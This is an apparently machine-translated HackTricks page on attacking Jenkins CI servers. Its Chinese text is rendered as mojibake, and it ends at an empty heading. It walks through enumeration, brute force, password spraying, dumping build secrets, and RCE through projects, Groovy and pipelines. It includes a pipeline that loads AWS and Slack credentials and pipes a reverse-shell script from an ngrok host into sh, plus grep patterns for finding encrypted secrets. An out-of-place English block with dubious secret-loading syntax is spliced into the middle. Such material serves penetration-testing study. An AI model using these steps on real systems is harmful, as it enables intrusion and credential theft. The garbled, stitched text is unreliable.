# Jenkinså®‰å…¨

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„è´¦å· ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

Jenkinsæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹å¼æ¥è®¾ç½®å‡ ä¹**ä»»ä½•**ç»„åˆçš„**è¯­è¨€**å’Œæºä»£ç ä»“åº“çš„**æŒç»­é›†æˆ**æˆ–**æŒç»­äº¤ä»˜**ï¼ˆCI/CDï¼‰ç¯å¢ƒï¼Œä½¿ç”¨æµæ°´çº¿ï¼Œä»¥åŠè‡ªåŠ¨åŒ–å…¶ä»–å¸¸è§„å¼€å‘ä»»åŠ¡ã€‚è™½ç„¶Jenkinsä¸èƒ½æ¶ˆé™¤ä¸ºæ¯ä¸ªæ­¥éª¤åˆ›å»ºè„šæœ¬çš„**éœ€æ±‚**ï¼Œä½†å®ƒç¡®å®ä¸ºæ‚¨æä¾›äº†ä¸€ç§æ¯”æ‚¨è‡ªå·±å®¹æ˜“æ„å»ºçš„æ›´å¿«é€Ÿå’Œæ›´å¼ºå¤§çš„æ–¹å¼æ¥é›†æˆæ•´ä¸ªæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²å·¥å…·é“¾ã€‚\
å®šä¹‰æ¥è‡ª[è¿™é‡Œ](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html)ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## æœªç»èº«ä»½éªŒè¯çš„æšä¸¾

ä¸ºäº†åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æœç´¢æœ‰è¶£çš„Jenkinsé¡µé¢ï¼ˆå¦‚_/people_æˆ–_/asynchPeople_ï¼Œè¿™äº›é¡µé¢åˆ—å‡ºäº†å½“å‰ç”¨æˆ·ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨ä¸éœ€è¦èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ _**/asynchPeople/**_ è·¯å¾„æˆ– _**/securityRealm/user/admin/search/index?q=**_ æ¥è·å– **ç”¨æˆ·å**ã€‚

æ‚¨å¯ä»¥ä»è·¯å¾„ _**/oops**_ æˆ– _**/error**_ è·å– Jenkins ç‰ˆæœ¬

![](<../../.gitbook/assets/image (48).png>)

### å·²çŸ¥æ¼æ´

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ç™»å½•

åœ¨åŸºæœ¬ä¿¡æ¯ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹**ç™»å½• Jenkins çš„æ‰€æœ‰æ–¹æ³•**ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### æ³¨å†Œ

æ‚¨å°†èƒ½å¤Ÿæ‰¾åˆ°å…è®¸æ‚¨åˆ›å»ºå¸æˆ·å¹¶ç™»å½•çš„ Jenkins å®ä¾‹ã€‚å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚

### **SSO ç™»å½•**

å¦‚æœå­˜åœ¨ **SSO åŠŸèƒ½/æ’ä»¶**ï¼Œåˆ™åº”å°è¯•ä½¿ç”¨æµ‹è¯•å¸æˆ·ï¼ˆä¾‹å¦‚æµ‹è¯• **Github/Bitbucket å¸æˆ·**ï¼‰ç™»å½•åº”ç”¨ç¨‹åºã€‚ä»[**è¿™é‡Œ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)è·å–çš„æŠ€å·§ã€‚

### æš´åŠ›ç ´è§£

**Jenkins** æ²¡æœ‰å®æ–½ä»»ä½•å¯†ç ç­–ç•¥æˆ–ç”¨æˆ·å**æš´åŠ›ç ´è§£é˜²æŠ¤**ã€‚å› æ­¤ï¼Œæ‚¨åº”è¯¥å§‹ç»ˆå°è¯•**æš´åŠ›ç ´è§£**ç”¨æˆ·ï¼Œå› ä¸ºå¯èƒ½ä½¿ç”¨äº†**å¼±å¯†ç **ï¼ˆç”šè‡³ä½¿ç”¨**ç”¨æˆ·åä½œä¸ºå¯†ç **æˆ–**åå‘**ç”¨æˆ·åä½œä¸ºå¯†ç ï¼‰ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### å¯†ç å–·æ´’

ä½¿ç”¨[è¿™ä¸ªPythonè„šæœ¬](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)æˆ–[è¿™ä¸ªPowerShellè„šæœ¬](https://github.com/chryzsh/JenkinsPasswordSpray)ã€‚

### IPç™½åå•ç»•è¿‡

è®¸å¤šç»„ç»‡å°†**åŸºäºSaaSçš„æºä»£ç ç®¡ç†ï¼ˆSCMï¼‰ç³»ç»Ÿ**ï¼ˆå¦‚GitHubæˆ–GitLabï¼‰ä¸**å†…éƒ¨**çš„è‡ªæ‰˜ç®¡**CI**è§£å†³æ–¹æ¡ˆï¼ˆå¦‚Jenkinsã€TeamCityï¼‰ç»“åˆä½¿ç”¨ï¼Œä»¥ä¾¿è¿™äº›CIç³»ç»Ÿå¯ä»¥ä»SaaSæºä»£ç ä¾›åº”å•†æ¥æ”¶Webhookäº‹ä»¶ï¼Œä»…ç”¨äºè§¦å‘æµæ°´çº¿ä½œä¸šã€‚

å› æ­¤ï¼Œç»„ç»‡å°†**SCM**çš„**IP**èŒƒå›´åˆ—å…¥ç™½åå•ï¼Œå…è®¸å®ƒä»¬é€šè¿‡**Webhook**è®¿é—®**å†…éƒ¨**çš„CIç³»ç»Ÿã€‚ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œ**ä»»ä½•äºº**éƒ½å¯ä»¥åœ¨GitHubæˆ–GitLabä¸­åˆ›å»ºä¸€ä¸ªå¸æˆ·ï¼Œå¹¶ä½¿å…¶**è§¦å‘Webhook**ï¼Œä»è€Œå‘**å†…éƒ¨CIç³»ç»Ÿ**å‘é€è¯·æ±‚ã€‚

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## å†…éƒ¨Jenkinsæ»¥ç”¨

åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å¸æˆ·æ¥è®¿é—®Jenkinsã€‚

{% hint style="warning" %}
æ ¹æ®Jenkinsä¸­é…ç½®çš„**æˆæƒ**æœºåˆ¶å’Œå—æŸç”¨æˆ·çš„æƒé™ï¼Œæ‚¨**å¯èƒ½èƒ½å¤Ÿæˆ–æ— æ³•æ‰§è¡Œä»¥ä¸‹æ”»å‡»**ã€‚
{% endhint %}

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### åˆ—å‡ºç”¨æˆ·

å¦‚æœæ‚¨å·²ç»è®¿é—®äº†Jenkinsï¼Œæ‚¨å¯ä»¥åœ¨[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ä¸­åˆ—å‡ºå…¶ä»–æ³¨å†Œç”¨æˆ·ã€‚

### è½¬å‚¨æ„å»ºä»¥æŸ¥æ‰¾æ˜æ–‡å¯†ç 

ä½¿ç”¨[è¿™ä¸ªè„šæœ¬](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)æ¥è½¬å‚¨æ„å»ºæ§åˆ¶å°è¾“å‡ºå’Œæ„å»ºç¯å¢ƒå˜é‡ï¼Œä»¥ä¾¿å¸Œæœ›æ‰¾åˆ°æ˜æ–‡å¯†ç ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **çªƒå–SSHå‡­æ®**

å¦‚æœè¢«å…¥ä¾µçš„ç”¨æˆ·å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥åˆ›å»º/ä¿®æ”¹æ–°çš„JenkinsèŠ‚ç‚¹ï¼Œå¹¶ä¸”å·²ç»å­˜å‚¨äº†è®¿é—®å…¶ä»–èŠ‚ç‚¹çš„SSHå‡­æ®ï¼Œä»–å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹èŠ‚ç‚¹å¹¶è®¾ç½®ä¸€ä¸ªä¸»æœºæ¥çªƒå–è¿™äº›å‡­æ®ï¼Œè€Œæ— éœ€éªŒè¯ä¸»æœºå¯†é’¥ï¼š

![](<../../.gitbook/assets/image (56).png>)

é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åœ¨å…¨å±€æä¾›è€…ï¼ˆ`/credentials/`ï¼‰ä¸­æ‰¾åˆ°Jenkinsçš„SSHå‡­æ®ï¼Œå› æ­¤æ‚¨ä¹Ÿå¯ä»¥åƒè½¬å‚¨å…¶ä»–ä»»ä½•ç§˜å¯†ä¸€æ ·è½¬å‚¨å®ƒä»¬ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§[**è½¬å‚¨ç§˜å¯†éƒ¨åˆ†**](./#dumping-secrets)ã€‚

### **Jenkinsä¸­çš„RCE**

åœ¨JenkinsæœåŠ¡å™¨ä¸­è·å–ä¸€ä¸ªshellä½¿æ”»å‡»è€…æœ‰æœºä¼šæ³„éœ²æ‰€æœ‰çš„**ç§˜å¯†**å’Œ**ç¯å¢ƒå˜é‡**ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨åŒä¸€ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨ç”šè‡³æ”¶é›†**äº‘å‡­æ®**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒJenkinså°†**â€œä»¥ç³»ç»Ÿèº«ä»½è¿è¡Œâ€æ„å»º**ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒä»¬å°†å…¶åˆ†é…ç»™**å¼ºå¤§çš„SYSTEMç”¨æˆ·**ï¼Œè¿™æ„å‘³ç€åœ¨æ„å»ºè¿‡ç¨‹ä¸­æ‰§è¡Œçš„ä»»ä½•æ“ä½œéƒ½æœ‰æƒé™æ‰§è¡Œä»»ä½•æ“ä½œã€‚

### **åˆ›å»º/ä¿®æ”¹é¡¹ç›®çš„RCE**

åˆ›å»º/ä¿®æ”¹é¡¹ç›®æ˜¯è·å¾—JenkinsæœåŠ¡å™¨ä¸ŠRCEçš„ä¸€ç§æ–¹æ³•ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **æ‰§è¡ŒGroovyè„šæœ¬çš„RCE**

æ‚¨è¿˜å¯ä»¥é€šè¿‡æ‰§è¡ŒGroovyè„šæœ¬æ¥è·å¾—RCEï¼Œè¿™å¯èƒ½æ¯”åˆ›å»ºæ–°é¡¹ç›®æ›´éšè”½ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### åˆ›å»º/ä¿®æ”¹Pipelineçš„RCE

æ‚¨è¿˜å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹Pipelineæ¥è·å¾—**RCE**ï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipelineåˆ©ç”¨

è¦åˆ©ç”¨ç®¡é“ï¼Œæ‚¨ä»ç„¶éœ€è¦è®¿é—®Jenkinsã€‚

### æ„å»ºPipeline

**Pipeline**ä¹Ÿå¯ä»¥ç”¨ä½œé¡¹ç›®ä¸­çš„**æ„å»ºæœºåˆ¶**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é…ç½®ä¸€ä¸ª**å­˜å‚¨åœ¨å­˜å‚¨åº“ä¸­çš„æ–‡ä»¶**ï¼Œå…¶ä¸­åŒ…å«ç®¡é“è¯­æ³•ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨`/Jenkinsfile`ï¼š

![](<../../.gitbook/assets/image (14) (1) (1).png>)

è¿˜å¯ä»¥å°†ç®¡é“é…ç½®æ–‡ä»¶**å­˜å‚¨åœ¨å…¶ä»–ä½ç½®**ï¼ˆä¾‹å¦‚å…¶ä»–å­˜å‚¨åº“ï¼‰ï¼Œä»¥å®ç°å­˜å‚¨åº“è®¿é—®å’Œç®¡é“è®¿é—®çš„**åˆ†ç¦»**ã€‚

å¦‚æœæ”»å‡»è€…å¯¹è¯¥æ–‡ä»¶å…·æœ‰**å†™è®¿é—®æƒé™**ï¼Œä»–å°†èƒ½å¤Ÿ**ä¿®æ”¹**å®ƒå¹¶**æ½œåœ¨è§¦å‘**ç®¡é“ï¼Œç”šè‡³æ— éœ€è®¿é—®Jenkinsã€‚\
æ”»å‡»è€…å¯èƒ½éœ€è¦**ç»•è¿‡ä¸€äº›åˆ†æ”¯ä¿æŠ¤**ï¼ˆå–å†³äºå¹³å°å’Œç”¨æˆ·æƒé™ï¼Œå®ƒä»¬å¯èƒ½ä¼šè¢«ç»•è¿‡æˆ–ä¸ä¼šè¢«ç»•è¿‡ï¼‰ã€‚

è§¦å‘è‡ªå®šä¹‰ç®¡é“çš„æœ€å¸¸è§æ–¹å¼æœ‰ï¼š

* å‘ä¸»åˆ†æ”¯ï¼ˆæˆ–å…¶ä»–åˆ†æ”¯ï¼‰å‘èµ·**æ‹‰å–è¯·æ±‚**
* å‘ä¸»åˆ†æ”¯ï¼ˆæˆ–å…¶ä»–åˆ†æ”¯ï¼‰**æ¨é€**
* **æ›´æ–°ä¸»åˆ†æ”¯**å¹¶ç­‰å¾…å…¶ä»¥æŸç§æ–¹å¼æ‰§è¡Œ

{% hint style="info" %}
å¦‚æœæ‚¨æ˜¯**å¤–éƒ¨ç”¨æˆ·**ï¼Œä¸åº”è¯¥æœŸæœ›èƒ½å¤Ÿåˆ›å»º**é’ˆå¯¹å…¶ä»–ç”¨æˆ·/ç»„ç»‡çš„ä¸»åˆ†æ”¯PR**å¹¶**è§¦å‘ç®¡é“**...ä½†å¦‚æœé…ç½®**ä¸å½“**ï¼Œæ‚¨å®Œå…¨å¯ä»¥é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´**å®Œå…¨æ”»é™·å…¬å¸**ã€‚
{% endhint %}

### Pipeline RCE

åœ¨å‰é¢çš„RCEéƒ¨åˆ†ä¸­ï¼Œå·²ç»æŒ‡å‡ºäº†ä¸€ç§[**ä¿®æ”¹ç®¡é“ä»¥è·å¾—RCEçš„æŠ€æœ¯**](./#rce-creating-modifying-pipeline)ã€‚

### æ£€æŸ¥ç¯å¢ƒå˜é‡

å¯ä»¥ä¸ºæ•´ä¸ªç®¡é“æˆ–ç‰¹å®šé˜¶æ®µå£°æ˜**æ˜æ–‡ç¯å¢ƒå˜é‡**ã€‚è¿™äº›ç¯å¢ƒå˜é‡**ä¸åº”åŒ…å«æ•æ„Ÿä¿¡æ¯**ï¼Œä½†æ”»å‡»è€…å§‹ç»ˆå¯ä»¥**æ£€æŸ¥æ‰€æœ‰ç®¡é“**é…ç½®/Jenkinsfilesï¼š
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### å¯†ç æ³„éœ²

æœ‰å…³Jenkinså¦‚ä½•å¤„ç†å¯†ç çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

å‡­æ®å¯ä»¥è¢«**å…¨å±€æä¾›è€…**ï¼ˆ`/credentials/`ï¼‰æˆ–**ç‰¹å®šé¡¹ç›®**ï¼ˆ`/job/<project-name>/configure`ï¼‰èŒƒå›´é™å®šã€‚å› æ­¤ï¼Œä¸ºäº†çªƒå–æ‰€æœ‰å‡­æ®ï¼Œæ‚¨éœ€è¦**è‡³å°‘å…¥ä¾µåŒ…å«å‡­æ®çš„æ‰€æœ‰é¡¹ç›®**å¹¶æ‰§è¡Œè‡ªå®šä¹‰/æ¶æ„æµæ°´çº¿ã€‚

è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºäº†åœ¨æµæ°´çº¿çš„ç¯å¢ƒä¸­è·å–**å¯†é’¥**ï¼Œæ‚¨éœ€è¦**çŸ¥é“å¯†é’¥çš„åç§°å’Œç±»å‹**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°è¯•å°†**`usernamePassword`** **å¯†é’¥**ä½œä¸º**`string`** **å¯†é’¥**åŠ è½½ï¼Œæ‚¨å°†æ”¶åˆ°ä»¥ä¸‹**é”™è¯¯**ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ä»¥ä¸‹æ˜¯åŠ è½½ä¸€äº›å¸¸è§å¯†é’¥ç±»å‹çš„æ–¹æ³•ï¼š

```markdown
## Secrets

Here you have the way to load some common secret types:

### Environment Variables

To load secrets from environment variables, you can use the following syntax:

```bash
${ENV_VARIABLE_NAME}
```

For example, to load a secret named `API_KEY` from an environment variable, you would use `${API_KEY}`.

### Files

To load secrets from files, you can use the `file` syntax:

```bash
file(path: 'path/to/secret/file')
```

For example, to load a secret from a file located at `/secrets/api_key.txt`, you would use `file(path: '/secrets/api_key.txt')`.

### Jenkins Credentials

To load secrets from Jenkins credentials, you can use the `credentials` syntax:

```bash
credentials('credential_id')
```

For example, to load a secret from a Jenkins credential with the ID `api_key`, you would use `credentials('api_key')`.

### Kubernetes Secrets

To load secrets from Kubernetes secrets, you can use the `kubernetes` syntax:

```bash
kubernetes(namespace: 'namespace', secretName: 'secret_name', secretKey: 'secret_key')
```

For example, to load a secret named `api_key` from a Kubernetes secret named `my_secret` in the `my_namespace` namespace, you would use `kubernetes(namespace: 'my_namespace', secretName: 'my_secret', secretKey: 'api_key')`.
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
åœ¨æœ¬é¡µçš„æœ«å°¾ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æ‰€æœ‰çš„å‡­æ®ç±»å‹ï¼š[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
ä¸€æ¬¡æ€§**è·å–æ‰€æœ‰ç§˜å¯†**çš„æœ€ä½³æ–¹æ³•æ˜¯é€šè¿‡**å…¥ä¾µ**Jenkinsæœºå™¨ï¼ˆä¾‹å¦‚åœ¨**å†…ç½®èŠ‚ç‚¹**ä¸­è¿è¡Œåå‘shellï¼‰ï¼Œç„¶å**æ³„éœ²**ä¸»å¯†é’¥å’ŒåŠ å¯†çš„ç§˜å¯†ï¼Œå¹¶åœ¨ç¦»çº¿çŠ¶æ€ä¸‹è§£å¯†å®ƒä»¬ã€‚\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[èŠ‚ç‚¹å’Œä»£ç†éƒ¨åˆ†](./#nodes-and-agents)å’Œ[åæ¸—é€éƒ¨åˆ†](./#post-exploitation)ã€‚
{% endhint %}

### è§¦å‘å™¨

æ ¹æ®[æ–‡æ¡£](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ï¼š`triggers`æŒ‡ä»¤å®šä¹‰äº†**è§¦å‘é‡æ–°è§¦å‘Pipelineçš„è‡ªåŠ¨æ–¹å¼**ã€‚å¯¹äºä¸GitHubæˆ–BitBucketç­‰æºé›†æˆçš„Pipelineï¼Œå¯èƒ½ä¸éœ€è¦`triggers`ï¼Œå› ä¸ºåŸºäºwebhooksçš„é›†æˆå¯èƒ½å·²ç»å­˜åœ¨ã€‚ç›®å‰å¯ç”¨çš„è§¦å‘å™¨æœ‰`cron`ã€`pollSCM`å’Œ`upstream`ã€‚

Cronç¤ºä¾‹ï¼š
```bash
triggers { cron('H */4 * * 1-5') }
```
è¯·æŸ¥çœ‹**æ–‡æ¡£ä¸­çš„å…¶ä»–ç¤ºä¾‹**ã€‚

### èŠ‚ç‚¹å’Œä»£ç†

ä¸€ä¸ª**Jenkinså®ä¾‹**å¯èƒ½åœ¨ä¸åŒçš„æœºå™¨ä¸Šè¿è¡Œ**ä¸åŒçš„ä»£ç†**ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè®¿é—®ä¸åŒçš„æœºå™¨æ„å‘³ç€å¯ä»¥çªƒå–**ä¸åŒçš„äº‘å‡­è¯**æˆ–è€…æ»¥ç”¨**ä¸åŒçš„ç½‘ç»œè®¿é—®**æ¥åˆ©ç”¨å…¶ä»–æœºå™¨ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

æ‚¨å¯ä»¥åœ¨`/computer/`ä¸­æšä¸¾**é…ç½®çš„èŠ‚ç‚¹**ï¼Œé€šå¸¸ä¼šæ‰¾åˆ°**å†…ç½®èŠ‚ç‚¹**ï¼ˆå³è¿è¡ŒJenkinsçš„èŠ‚ç‚¹ï¼‰å’Œå…¶ä»–å¯èƒ½çš„èŠ‚ç‚¹ï¼š

![](<../../.gitbook/assets/image (25).png>)

**å…¥ä¾µå†…ç½®èŠ‚ç‚¹**ç‰¹åˆ«æœ‰è¶£ï¼Œå› ä¸ºå®ƒåŒ…å«æ•æ„Ÿçš„Jenkinsä¿¡æ¯ã€‚

è¦æŒ‡ç¤ºæ‚¨å¸Œæœ›åœ¨**å†…ç½®JenkinsèŠ‚ç‚¹**ä¸Šè¿è¡Œ**æµæ°´çº¿**ï¼Œæ‚¨å¯ä»¥åœ¨æµæ°´çº¿ä¸­æŒ‡å®šä»¥ä¸‹é…ç½®ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œæ•´ç¤ºä¾‹

åœ¨ç‰¹å®šä»£ç†ä¸Šçš„æµæ°´çº¿ï¼Œä½¿ç”¨cronè§¦å‘å™¨ï¼Œå…·æœ‰æµæ°´çº¿å’Œé˜¶æ®µç¯å¢ƒå˜é‡ï¼Œåœ¨ä¸€ä¸ªæ­¥éª¤ä¸­åŠ è½½2ä¸ªå˜é‡å¹¶å‘é€åå‘shellï¼š
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## åæ¸—é€

### Metasploit

Metasploitæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„åæ¸—é€å·¥å…·ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—çš„æ¨¡å—å’Œæœ‰æ•ˆè½½è·ï¼Œç”¨äºåˆ©ç”¨å·²ç»å…¥ä¾µçš„ç³»ç»Ÿã€‚è¿™äº›æ¨¡å—å’Œæœ‰æ•ˆè½½è·å¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå„ç§æ“ä½œï¼ŒåŒ…æ‹¬è·å–æ•æ„Ÿä¿¡æ¯ã€è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€å»ºç«‹æŒä¹…æ€§è®¿é—®ç­‰ã€‚Metasploitè¿˜æä¾›äº†ä¸€ä¸ªäº¤äº’å¼çš„å‘½ä»¤è¡Œç•Œé¢ï¼Œä½¿æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿæ›´æ–¹ä¾¿åœ°ä½¿ç”¨è¿™äº›åŠŸèƒ½ã€‚
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

å¦‚æœæ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå¯ä»¥è®¿é—®`/credentials/`æ¥åˆ—å‡ºç§˜å¯†ã€‚è¯·æ³¨æ„ï¼Œè¿™åªä¼šåˆ—å‡º`credentials.xml`æ–‡ä»¶ä¸­çš„ç§˜å¯†ï¼Œä½†æ˜¯**æ„å»ºé…ç½®æ–‡ä»¶**å¯èƒ½è¿˜åŒ…å«**æ›´å¤šå‡­æ®**ã€‚

å¦‚æœæ‚¨å¯ä»¥**æŸ¥çœ‹æ¯ä¸ªé¡¹ç›®çš„é…ç½®**ï¼Œæ‚¨è¿˜å¯ä»¥åœ¨å…¶ä¸­çœ‹åˆ°ç”¨äºè®¿é—®å­˜å‚¨åº“å’Œ**é¡¹ç›®çš„å…¶ä»–å‡­æ®**çš„**å‡­æ®ï¼ˆç§˜å¯†ï¼‰çš„åç§°**ã€‚

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### ä»Groovyä¸­

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ä»ç£ç›˜ä¸­

è¿™äº›æ–‡ä»¶ç”¨äº**è§£å¯†Jenkinsç§˜å¯†**ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

è¿™æ ·çš„**ç§˜å¯†é€šå¸¸å¯ä»¥åœ¨**ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ä»¥ä¸‹æ˜¯ç”¨äºæŸ¥æ‰¾å®ƒä»¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### ç¦»çº¿è§£å¯†Jenkinså¯†ç 

